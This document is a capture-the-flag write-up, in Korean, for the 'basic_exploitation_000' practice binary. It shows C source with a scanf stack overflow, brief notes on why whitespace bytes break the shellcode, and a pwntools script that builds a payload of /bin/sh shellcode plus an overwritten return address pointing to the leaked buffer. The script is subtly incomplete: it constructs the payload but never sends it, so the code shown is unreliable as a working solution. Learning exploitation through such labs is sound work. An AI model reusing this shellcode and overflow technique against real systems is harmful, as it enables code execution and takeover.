## basic_exploitation_000
---

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}


int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();
    
    printf("buf = (%p)\n", buf);
    scanf("%141s", buf);

    return 0;
}
```

<br><br>

## Solution
---

처음엔 shellcraft.sh로 보내려 했는데, EOF가 떴다.

그래서 가지고 있던 셸코드로 보냈는데 이것 또한 EOF가 떴다.

확인해보니 scanf는 공백, tab 등등을 받을 수가 없는데 이러한 값들이 포함되어 있었다.

그래서 shellcode를 잘 확인해서 보내야 한다.

nop sled를 하기에는 buf의 주소가 계속 변경되고, 환경변수를 이용한 방법은 당연히 안되고 해서 그냥 셸코드를 넣고 리턴 주소를 버퍼 변수의 주소로 해주면 된다.

<br>

```python
from pwn import *

p = process('./basic_exploitation_000')

shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"

p.recvuntil('buf = (')
buf_addr = int(p.recv(10),16)
p.recvuntil('\n')

payload = shellcode + b"A"*(0x80-len(shellcode)) + b"BBBB" + p32(buf_addr)

p.interactive()
```
